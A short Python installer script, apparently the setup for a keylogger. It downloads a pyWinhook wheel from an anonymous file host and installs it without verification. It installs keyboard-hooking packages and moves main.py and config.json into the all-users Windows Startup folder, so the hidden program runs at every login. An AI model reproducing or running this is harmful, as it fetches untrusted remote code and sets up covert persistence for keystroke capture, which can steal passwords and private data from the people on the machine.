import os
import subprocess
import sys

import requests


def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


# download all needed libraries
r = requests.get(
    "https://cdn-115.anonfiles.com/Pdy9l9xaud/0a52e7e1-1621545780/pyWinhook-1.6.2-cp39-cp39-win_amd64.whl",
    allow_redirects=True,
)
open("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl", "wb").write(r.content)
install("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl")
os.remove("pyWinhook-1.6.2-cp39-cp39-win_amd64.whl")

install("pythoncom")
install("keyboard")

# move main and config to startup folder
os.rename(
    "main.py", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\main.py"
)
os.rename(
    "config.json",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\config.json",
)
